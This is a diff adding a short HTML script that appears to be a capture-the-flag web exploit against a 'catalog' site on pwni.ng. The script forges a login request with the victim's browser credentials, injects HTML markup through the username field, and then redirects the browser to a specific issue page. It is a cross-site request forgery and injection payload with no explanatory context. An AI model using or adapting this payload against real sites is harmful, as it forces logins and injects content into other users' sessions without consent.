@@ -1,0 +1,13 @@
+<script>
+fetch("http://catalog.pwni.ng/user.php", {
+	method: "POST",
+	mode: "no-cors",
+	credentials: "include",
+	headers: {
+		"content-type": "application/x-www-form-urlencoded"
+	},
+	body: `username=${encodeURIComponent("<marquee scrollamount='20'>Nice!</marquee>")}&password=fail&action=login`
+}).then(() => {
+	window.location = "http://catalog.pwni.ng/issue.php?id=19929";
+});
+</script>
